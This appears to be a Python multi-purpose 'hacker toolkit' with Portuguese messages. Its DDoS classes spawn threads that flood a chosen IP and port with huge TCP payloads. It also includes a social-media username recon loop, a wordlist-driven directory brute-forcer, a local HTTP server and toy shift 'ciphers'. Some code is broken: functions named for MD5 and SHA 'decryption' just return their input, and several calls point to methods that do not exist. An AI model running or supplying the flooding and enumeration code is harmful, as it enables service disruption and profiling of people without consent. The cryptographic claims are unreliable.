import os
import socket
import threading
import requests
import time
import http.server
import socketserver
import random
import hashlib

class c:
    @staticmethod
    def red(text):
        return f"\033[1;91m{text}\033[0m"

    @staticmethod
    def orange(text):
        return f"\033[1;38;5;202m{text}\033[0m"

    @staticmethod
    def yellow(text):
        return f"\033[1;93m{text}\033[0m"

    @staticmethod
    def green(text):
        return f"\033[1;92m{text}\033[0m"

    @staticmethod
    def blue(text):
        return f"\033[1;94m{text}\033[0m"

    @staticmethod
    def magenta(text):
        return f"\033[1;35m{text}\033[0m"  # Magenta (not pink)

    @staticmethod
    def cyan(text):
        return f"\033[1;96m{text}\033[0m"

    @staticmethod
    def purple(text):
        return f"\033[1;38;5;129m{text}\033[0m"

    @staticmethod
    def pink(text):
        return f"\033[1;38;5;219m{text}\033[0m"

    @staticmethod
    def black(text):
        return f"\033[1;38;5;232m{text}\033[0m"

    @staticmethod
    def gray(text):
        return f"\033[1;38;5;245m{text}\033[0m"

    @staticmethod
    def white(text):
        return f"\033[1;97m{text}\033[0m"

tagn1 = f"{c.cyan('[')}{c.yellow('1')}{c.cyan(']')}"
tagn2 = f"{c.cyan('[')}{c.yellow('2')}{c.cyan(']')}"
tagn3 = f"{c.cyan('[')}{c.yellow('3')}{c.cyan(']')}"
tagn4 = f"{c.cyan('[')}{c.yellow('4')}{c.cyan(']')}"
tagn5 = f"{c.cyan('[')}{c.yellow('5')}{c.cyan(']')}"
tagn6 = f"{c.cyan('[')}{c.yellow('6')}{c.cyan(']')}"
tagn7 = f"{c.cyan('[')}{c.yellow('7')}{c.cyan(']')}"
tagn8 = f"{c.cyan('[')}{c.yellow('8')}{c.cyan(']')}"
tagn9 = f"{c.cyan('[')}{c.yellow('9')}{c.cyan(']')}"
tagn10 = f"{c.cyan('[')}{c.yellow('10')}{c.cyan(']')}"
hashtag_red = rf"{c.cyan('[')}{c.yellow('#')}{c.cyan(']')}"
more_red = rf"{c.cyan('[')}{c.yellow('+')}{c.cyan(']')}"
quest_red = rf"{c.cyan('[')}{c.yellow('?')}{c.cyan(']')}"
minus_red = rf"{c.cyan('[')}{c.yellow('-')}{c.cyan(']')}"

class decrypter:
    def crypt_caesar(text, shift): 
        encrypted_text = "" 
        for char in text:
            if char.isalpha():
                if char.isupper():
                    encrypted_text += chr((ord(char) - 65 + shift) % 26 + 65)
                else:
                    encrypted_text += chr((ord(char) - 97 + shift) % 26 + 97)
            else:
                encrypted_text += char
        return encrypted_text #retorna o texto

    def decrypt_caesar(encrypted_text, shift):
        return decrypter.crypt(encrypted_text, -shift)

    def decrypt_all_possible_caesar(text, max_shift=25):
        results = []
        
        for shift in range(max_shift + 1):
            decrypted_text = decrypter.decrypt(text, shift)
            results.append(decrypted_text)
        
        return results

    def format_output(decrypted_list):
        output = ""
        number = 1
        for decrypted in decrypted_list:
            print(f"{c.yellow('|')} #{number} {c.green(decrypted)} {c.yellow('|')}\n")
            number += 1

    def descriptografar_md5(texto_criptografado):
        return texto_criptografado

    def descriptografar_sha(texto_criptografado):
        return texto_criptografado

    def descriptografar_y4x(texto_criptografado):
        descriptografado = ""
        for char in texto_criptografado:
            if char.isalpha():
                descriptografado += chr(ord(char) - 7)
            else:
                descriptografado += char
        return descriptografado

    def descriptografar_r7g(texto_criptografado):
        descriptografado = ""
        for char in texto_criptografado:
            if char.isalpha():
                descriptografado += chr(ord(char) - 11)
            else:
                descriptografado += char
        return descriptografado

    def descriptografar_flk(texto_criptografado):
        descriptografado = ""
        for char in texto_criptografado:
            if char.isalpha():
                descriptografado += chr(ord(char) - 21)
            else:
                descriptografado += char
        return descriptografado

    def descriptografar_h1x(texto_criptografado):
        descriptografado = ""
        for char in texto_criptografado:
            if char.isalpha():
                descriptografado += chr(ord(char) - 53)
            else:
                descriptografado += char
        return descriptografado
        
    def descriptografar_fck(texto_criptografado):
        descriptografado = ""
        for char in texto_criptografado:
            if char.isalpha():
                descriptografado += chr(ord(char) - 9517)
            else:
                descriptografado += char
        return descriptografado

    def descriptografar_sla(texto_criptografado):
        descriptografado = ""
        for char in texto_criptografado:
            if char.isalpha():
                descriptografado += chr(ord(char) - 1733)
            else:
                descriptografado += char
        return descriptografado

class crypter:
    def crypt_caesar(text, shift): 
        encrypted_text = "" 
        for char in text:
            if char.isalpha():
                if char.isupper():
                    encrypted_text += chr((ord(char) - 65 + shift) % 26 + 65)
                else:
                    encrypted_text += chr((ord(char) - 97 + shift) % 26 + 97)
            else:
                encrypted_text += char
        return encrypted_text #retorna o texto

    def decrypt_caesar(encrypted_text, shift):
        return decrypter.crypt(encrypted_text, -shift)

    def decrypt_all_possible_caesar(text, max_shift=25):
        results = []
        
        for shift in range(max_shift + 1):
            decrypted_text = decrypter.decrypt(text, shift)
            results.append(decrypted_text)
        
        return results

    def format_output(decrypted_list):
        output = ""
        number = 1
        for decrypted in decrypted_list:
            output += f"{c.yellow('|')} #{number} {c.green(decrypted)} {c.yellow('|')}\n"
            number += 1
        return output
    
    def criptografar_md5(texto):
        md5_hash = hashlib.md5()
        md5_hash.update(texto.encode('utf-8'))
        return md5_hash.hexdigest()

    def criptografar_sha(texto):
        sha_hash = hashlib.sha256()
        sha_hash.update(texto.encode('utf-8'))
        return sha_hash.hexdigest()

    def criptografar_y4x(texto):
        criptografado = ""
        for char in texto:
            if char.isalpha():
                criptografado += chr(ord(char) + 7)
            else:
                criptografado += char
        return criptografado

    def criptografar_r7g(texto):
        criptografado = ""
        for char in texto:
            if char.isalpha():
                criptografado += chr(ord(char) + 11)
            else:
                criptografado += char
        return criptografado

    def criptografar_flk(texto):
        criptografado = ""
        for char in texto:
            if char.isalpha():
                criptografado += chr(ord(char) + 21)
            else:
                criptografado += char
        return criptografado

    def criptografar_h1x(texto):
        criptografado = ""
        for char in texto:
            if char.isalpha():
                criptografado += chr(ord(char) + 53)
            else:
                criptografado += char
        return criptografado


    def criptografar_fcking(texto):
        criptografado = ""
        for char in texto:
            if char.isalpha():
                criptografado += chr(ord(char) + 9517)
            else:
                criptografado += char
        return criptografado
        
    def criptografar_sla(texto):
        criptografado = ""
        for char in texto:
            if char.isalpha():
                criptografado += chr(ord(char) + 1733)
            else:
                criptografado += char
        return criptografado
        
    def criptografar_xtc(texto):
        criptografado = ""
        for char in texto:
            if char.isalpha():
                criptografado += chr(ord(char) + 8932)
            else:
                criptografado += char
        return criptografado


class server:

    def start():
        class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                request_info = f"{c.yellow('<--')} {c.yellow('|')} {c.cyan('Request Code')} {c.yellow('|')} {c.purple('IP')} {c.yellow('|')} {c.yellow('-->')}"
                
                request_line = f"{c.yellow('<--')} | {c.cyan(format % args)} | {c.green(self.headers.get('User-Agent', 'Unknown').split('(')[0].strip())} | {c.purple(self.client_address[0])} | {c.yellow('-->')}"
                print(request_line)

        port_choose = input(f"""
    {tagn1} {c.cyan('Random Port')}
    {tagn2} {c.cyan('Choose Port')}

    {hashtag_red} {c.cyan('Choose one')}: """)

        if port_choose == "1":
            port = random.randint(1024, 80000)
        elif port_choose == "2":
            port = int(input(f'    {hashtag_red} {c.cyan("Choose a port (more than 1024): ")}'))
            if port <= 1024:
                print(f"{c.red('Invalid port number!')} Please choose a port greater than 1024.")
                exit(1)
        else:
            print(f"{c.red('Invalid choice!')} Exiting...")
            exit(1)

        handler = CustomHTTPRequestHandler 

        with socketserver.TCPServer(("", port), handler) as httpd:
            print(f"Servidor rodando em http://localhost:{port} (seu ip)")
            httpd.serve_forever()


class checkstatus:

    def verificar_estado_site(url):
        while True:
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    print(f"    {hashtag_red} {c.cyan('O site está ')}{c.green('ativo')}")
                else:
                    print(f"    {hashtag_red} {c.cyan('O site está ')}{c.gred('inativo')} ", c.yellow(response.status_code))
            except requests.exceptions.RequestException:
                print(f"{hashtag_red} {c.cyan('Ocorreu um ')}{c.red('ERRO')} {c.cyan('ao verificar o estado do site')}")

            time.sleep(0.5)

class DDOS:

    def start(target_ip, target_port, num_threads, packet_size_mb=50):
        target_address = (target_ip, target_port)
        packet_size = packet_size_mb * 1024 * 1024
    
        def attack():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect(target_address)
                    payload = b'A' * packet_size
                    s.sendto(payload, target_address)
                    s.close()
                    print(f"    {hashtag_red} {c.cyan('Attacking')}")
                except:
                    pass
    
        for _ in range(num_threads):
            thread = threading.Thread(target=attack)
            thread.start()

class d:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def attack(self, packet_size):
        def send_packet():
            try:
                self.sock.connect((self.target_ip, self.target_port))
                while True:
                    self.sock.send(b"A" * packet_size)
            except:
                pass

        attack_thread = threading.Thread(target=send_packet)
        attack_thread.start()


class r:
    def recon(username):
        social_media_sites = [
        "https://www.facebook.com/",
        "https://www.instagram.com/",
        "https://www.twitter.com/",
        "https://www.linkedin.com/in/",
        "https://www.youtube.com/user/",
        "https://www.pinterest.com/",
        "https://www.snapchat.com/add/",
        "https://www.reddit.com/user/",
        "https://www.tiktok.com/@",
        "https://www.twitch.tv/",
        "https://www.whatsapp.com/",
        "https://www.vk.com/",
        "https://www.tumblr.com/",
        "https://www.flickr.com/people/",
        "https://www.medium.com/@",
        "https://www.soundcloud.com/",
        "https://www.github.com/",
        "https://www.behance.net/",
        "https://www.dribbble.com/",
        "https://www.deviantart.com/",
        "https://www.behance.net/",
        "https://www.producthunt.com/@",
        "https://www.stackoverflow.com/users/",
        "https://www.quora.com/profile/",
        "https://www.goodreads.com/user/show/",
        "https://www.wattpad.com/user/",
        "https://www.behance.net/",
        "https://www.vimeo.com/",
        "https://www.disqus.com/by/"
        "https://www.patreon.com/"
    ]

        for site in social_media_sites:
            url = site + username
            response = requests.get(url)
            if response.status_code == 200:
                print(f"    {c.cyan('[')}{c.yellow('+')}{c.cyan(']')}{c.green(' Acc Found: ')} {c.green(url)}")
            else:
                print(f"    {more_red} {c.yellow('Not Found: ')} {c.yellow(site)}")

class f:
    def dir(url, wordlist):
        with open(wordlist, "r") as file:
            for line in file:
                directory = line.strip()
                full_url = f"{url}/{directory}"
                response = requests.get(full_url)
                if response.status_code == 200:
                    print(f"{more_red} {c.green('Found: ')}{c.green(full_url)}")
                elif response.status_code == 403:
                    print(f"{quest_red} {c.cyan('Forbidden: ')}{c.cyan(full_url)}")
                elif response.status_code == 404:
                    print(f"{minus_red} {c.yellow('Not Found: ')}{c.yellow(full_url)}")

class adress:

    def obter_endereco(lat, long):
        
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={long}&format=json"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            endereco = data.get("display_name")
            return endereco
        return None
